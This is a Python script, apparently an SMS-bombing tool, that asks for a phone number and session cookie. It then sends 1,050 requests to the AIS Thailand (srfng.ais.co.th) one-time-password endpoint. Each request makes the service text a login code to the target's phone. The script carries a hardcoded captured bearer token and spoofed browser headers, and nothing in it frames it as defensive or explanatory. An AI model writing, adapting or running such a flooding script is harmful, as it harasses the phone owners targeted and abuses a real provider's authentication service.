import requests
import time
import json
phone = input("PHONE ID : ")
cookie = input("COOKIE ID : ")


headers = {
  "Host": "srfng.ais.co.th",
  "Connection": "keep-alive",
  "Content-Length": "254",
  "sec-ch-ua-mobile": "?0",
  "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIyMDQyMjIxMDQwODQ5MEliWk1oN0Q4Y0l4RW4iLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTY1MDYzNjI0OCwiZXhwIjoxNjUwNjM3NDQ4fQ.Co41hH4SsiuQ1PkZu12I5LtMeNdQgScl_nbSCGzwvVQ",
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  "Accept": "*/*",
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
  "X-Requested-With": "XMLHttpRequest",
  "sec-ch-ua-platform": "Linux",
  "Origin": "https://srfng.ais.co.th",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Referer": "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
  "Cookie": f"{cookie}"
}

data = {
  "msisdn":f"{phone}",
  "serviceId":"AISPlay",
  "accountType":"all",
  "otpChannel":"sms"
}

for i in range(1050):
  i += 1
  name = requests.post("https://srfng.ais.co.th/api/v2/login/sendOneTimePW",data=data, headers=headers)

  result = name.json()
  if (result['resultCode'] == '50000'):
    print("Send Message Error!")
  else:
    print("Send Message Success!")
